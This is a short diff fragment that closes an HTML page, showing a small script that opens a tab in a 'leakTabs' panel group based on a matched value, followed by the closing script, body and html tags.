+    if (m) {
+      const tab = document.querySelector(`#leakTabs .leak-tab[data-panel="${m[1]}"]`);
+      if (tab) tab.click();
+    }
+  })();
+</script>
+</body>
+</html>
